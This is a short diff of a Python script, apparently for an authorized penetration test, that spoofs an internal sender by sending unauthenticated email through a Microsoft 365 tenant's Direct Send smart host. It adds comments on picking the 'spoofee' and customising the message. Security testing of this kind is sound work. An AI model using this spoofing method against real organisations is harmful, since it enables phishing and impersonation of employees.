@@ -233,10 +233,12 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from datetime import datetime
 
+#connect to the target's smart host and choose the intended spoofee
 smart_host = "[TENANT].mail.protection.outlook.com"
 from_addr  = "[TARGET-USER]@[CLIENT-DOMAIN]"
 to_addr    = "[TARGET-USER]@[CLIENT-DOMAIN]"
 
+#customize message subject and body for own needs, ticket number reference ect..
 msg = MIMEMultipart()
 msg['Subject'] = f"AUTHORIZED PENTEST - Direct Send Simulation {datetime.now().strftime('%m/%d/%Y %H:%M')}"
 msg['From']    = from_addr
@@ -245,12 +247,11 @@ msg['To']      = to_addr
 body = MIMEText("""
 AUTHORIZED Direct Send abuse simulation.
 - Method : Unauthenticated SMTP via Direct Send smart host
-- No credentials used
-- Source  : Azure Cloud Shell (external IP)
 - Ref     : PENTEST-DIRECTSEND-001
 """)
 msg.attach(body)
 
+#output message upon success/failed connection
 try:
     s = smtplib.SMTP(smart_host, 25, timeout=20)
     s.ehlo("localhost")
